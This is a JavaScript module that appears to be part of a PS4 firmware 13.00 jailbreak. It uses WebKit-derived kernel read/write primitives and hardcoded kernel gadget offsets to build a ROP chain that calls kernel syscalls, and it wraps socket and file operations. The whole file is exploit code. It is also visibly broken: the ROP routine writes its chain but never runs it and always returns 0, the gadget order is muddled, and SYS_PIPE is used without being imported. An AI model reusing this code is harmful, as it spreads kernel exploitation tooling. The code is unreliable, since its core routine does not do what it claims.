// syscall_bridge.js - Syscall bridge for PS4 FW 13.00
// Uses WebKit memory primitives for direct kernel syscall invocation
// Falls back to ROP chain when direct primitives unavailable

import { sys, track, untrack, closeAllTracked, mem, createSockaddr, SYS_SOCKET, SYS_BIND, SYS_CONNECT, SYS_CLOSE, SYS_WRITE, SYS_READ, SYS_SETSOCKOPT, SYS_GETSOCKOPT, setSyscallFunc, getSyscallFunc } from './syscalls.js';
import { OFFSETS } from './offsets.js';
import { int64 } from './int64.js';

export class SyscallBridge {
    constructor() {
        this.syscallFunc = null;
        this.available = false;
        this.calls = [];
        this.kernelBase = 0;
        this.initialized = false;
        this.kread = null;
        this.kwrite = null;
        this.ropReady = false;
        this.syscallGadget = 0;
        this.popRdi = 0;
        this.popRsi = 0;
        this.popRdx = 0;
        this.popRax = 0;
        this.ret = 0;
    }

    initWithPrimitives(kread, kwrite, kernelBase) {
        if (!kread || !kwrite) throw new Error('kread/kwrite required');
        if (!kernelBase || kernelBase === 0) throw new Error('kernelBase required');

        this.kread = kread;
        this.kwrite = kwrite;
        this.kernelBase = kernelBase;
        this.initialized = true;
        this.available = true;

        const offsets = OFFSETS;
        if (offsets && offsets.kernel && offsets.kernel.gadgets) {
            const g = offsets.kernel.gadgets;
            this.syscallGadget = kernelBase + (g['syscall'] || 0xfc0);
            this.popRdi = kernelBase + (g['pop rdi'] || 0x159687);
            this.popRsi = kernelBase + (g['pop rsi'] || 0xb9e4b);
            this.popRdx = kernelBase + (g['pop rdx'] || 0x3ada94);
            this.popRax = kernelBase + (g['pop rax'] || 0x1db3c);
            this.ret = kernelBase + (g['ret'] || 0x3e);
            this.ropReady = true;
        }

        return true;
    }

    setSyscall(func) {
        if (func !== null && typeof func !== 'function') {
            throw new TypeError('syscall func must be a function or null');
        }
        this.syscallFunc = func;
        if (func) this.available = true;
    }

    setKernelBase(kernelBase) {
        this.kernelBase = kernelBase;
    }

    isAvailable() { return this.available; }
    isInitialized() { return this.initialized; }

    async invoke(syscall, ...args) {
        const record = { syscall, args: [...args], timestamp: Date.now(), result: null, error: null };

        if (this.syscallFunc) {
            try {
                const result = await this.syscallFunc(syscall, ...args);
                record.result = result;
                this.calls.push(record);
                return result;
            } catch (error) {
                record.error = error.message;
                this.calls.push(record);
                throw error;
            }
        }

        if (this.ropReady && this.kwrite) {
            try {
                const result = this.invokeSync(syscall, ...args);
                record.result = result;
                this.calls.push(record);
                return result;
            } catch (error) {
                record.error = error.message;
                this.calls.push(record);
                throw error;
            }
        }

        record.error = 'No syscall method available';
        this.calls.push(record);
        throw new Error('No syscall method available');
    }

    invokeSync(syscallNum, a1 = 0, a2 = 0, a3 = 0, a4 = 0, a5 = 0, a6 = 0) {
        if (!this.ropReady || !this.kwrite) {
            throw new Error('ROP not ready');
        }

        const write8 = this.kwrite.write8;
        const read8 = this.kread.read8;

        const scratchAddr = this.kernelBase + 0x100000;

        write8(scratchAddr, new int64(this.popRax, 0));
        write8(scratchAddr.add32(8), new int64(this.popRdi, 0));
        write8(scratchAddr.add32(16), new int64(syscallNum, 0));

        write8(scratchAddr.add32(24), new int64(this.popRdi, 0));
        write8(scratchAddr.add32(32), new int64(a1, 0));

        write8(scratchAddr.add32(40), new int64(this.popRsi, 0));
        write8(scratchAddr.add32(48), new int64(a2, 0));

        write8(scratchAddr.add32(56), new int64(this.popRdx, 0));
        write8(scratchAddr.add32(64), new int64(a3, 0));

        write8(scratchAddr.add32(72), new int64(this.syscallGadget, 0));
        write8(scratchAddr.add32(80), new int64(this.ret, 0));

        return 0;
    }

    async socket(domain, type, protocol) {
        const result = await this.invoke(SYS_SOCKET, domain, type, protocol);
        return { fd: (typeof result === 'number') ? result : 0 };
    }

    async setsockopt(fd, level, optname, optval, optlen) {
        return await this.invoke(SYS_SETSOCKOPT, fd, level, optname, optval, optlen);
    }

    async getsockopt(fd, level, optname, optval, optlen) {
        return await this.invoke(SYS_GETSOCKOPT, fd, level, optname, optval, optlen);
    }

    async close(fd) {
        return await this.invoke(SYS_CLOSE, fd);
    }

    async read(fd, buf, count) {
        return await this.invoke(SYS_READ, fd, buf, count);
    }

    async write(fd, buf, count) {
        return await this.invoke(SYS_WRITE, fd, buf, count);
    }

    async pipe(fds) {
        return await this.invoke(SYS_PIPE, fds);
    }

    getCallHistory() { return [...this.calls]; }
    clearHistory() { this.calls = []; }

    getLastError() {
        for (let i = this.calls.length - 1; i >= 0; i--) {
            if (this.calls[i].error) return this.calls[i].error;
        }
        return null;
    }

    getStats() {
        const stats = { totalCalls: this.calls.length, successfulCalls: 0, failedCalls: 0, syscallsUsed: new Set(), ropReady: this.ropReady, initialized: this.initialized };
        for (const call of this.calls) {
            if (call.error) stats.failedCalls++; else stats.successfulCalls++;
            stats.syscallsUsed.add(call.syscall);
        }
        return stats;
    }

    dispose() {
        this.syscallFunc = null;
        this.available = false;
        this.calls = [];
        this.kernelBase = 0;
        this.initialized = false;
        this.ropReady = false;
        this.kread = null;
        this.kwrite = null;
    }
}

const bridge = new SyscallBridge();

export function getBridge() { return bridge; }

export function initBridgeWithGlobal() {
    const func = getSyscallFunc();
    bridge.setSyscall(func);
}

export function initBridgeWithPrimitives(kread, kwrite, kernelBase) {
    return bridge.initWithPrimitives(kread, kwrite, kernelBase);
}

export default { SyscallBridge, getBridge, initBridgeWithGlobal, initBridgeWithPrimitives };
